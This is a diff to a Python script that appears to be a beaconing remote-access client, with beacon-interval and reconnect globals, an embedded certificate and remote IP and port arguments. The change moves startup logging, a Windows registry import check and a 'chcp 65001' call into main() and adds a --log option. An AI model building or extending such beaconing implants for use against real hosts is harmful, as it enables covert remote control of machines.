@@ -56,32 +56,6 @@ def log_line(line):
             print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
             print_fail("Unable to Write Log File")
 
-log = "Current Working Directory: " + getcwd()
-chdir(path.dirname(argv[0]))
-OUTPUT_FILE_DIR = getcwd()
-if DEBUG:
-    print(log)
-    if OUTPUT_FILE:
-        log_line(log)
-    log = "New Working Directory: " + getcwd()
-    print(log)
-    if OUTPUT_FILE:
-        log_line(log)
-try:
-    if name  == "nt":
-        winreg_exists = util.find_spec('winreg')
-        if winreg_exists:
-            import winreg
-except:
-    if DEBUG:
-        print_warn(exc_info())
-        
-    if OUTPUT_FILE:
-        log_line(str(exc_info()))
-
-system('chcp 65001')
-
-
 def create_keys():
     server_cert ='''\
 -----BEGIN CERTIFICATE-----
@@ -679,14 +653,46 @@ def beacon_drift(value=30):
 def main():
     global BEACON_INTERVAL_SETTING
     global RECONNECT_ATTEMPTS
+    global OUTPUT_FILE
     global remote_port
     global remote_ip
+
+    log = "Current Working Directory: " + getcwd()
+    chdir(path.dirname(argv[0]))
+    OUTPUT_FILE_DIR = getcwd()
+    if DEBUG:
+        print(log)
+        if OUTPUT_FILE:
+            log_line(log)
+        log = "New Working Directory: " + getcwd()
+        print(log)
+        if OUTPUT_FILE:
+            log_line(log)
+    try:
+        if name  == "nt":
+            winreg_exists = util.find_spec('winreg')
+            if winreg_exists:
+                import winreg
+    except:
+        if DEBUG:
+            print_warn(exc_info())
+            
+        if OUTPUT_FILE:
+            log_line(str(exc_info()))
+
+    system('chcp 65001')
+
     parser = argparse.ArgumentParser(description="")
     parser.add_argument('-p', action='store', dest='remote_port',
                             help='Remote Port',default=remote_port)
     parser.add_argument('-i', action='store', dest='remote_ip',
                             help='Remote IP',default=remote_ip)
+    parser.add_argument('--log', action='store_true', dest='log',
+                            help='Remote IP',default=False)                        
     args = parser.parse_args()
+
+    OUTPUT_FILE = args.log
+
     remote_ip = args.remote_ip
     remote_port = int(args.remote_port)
     if name == "nt":
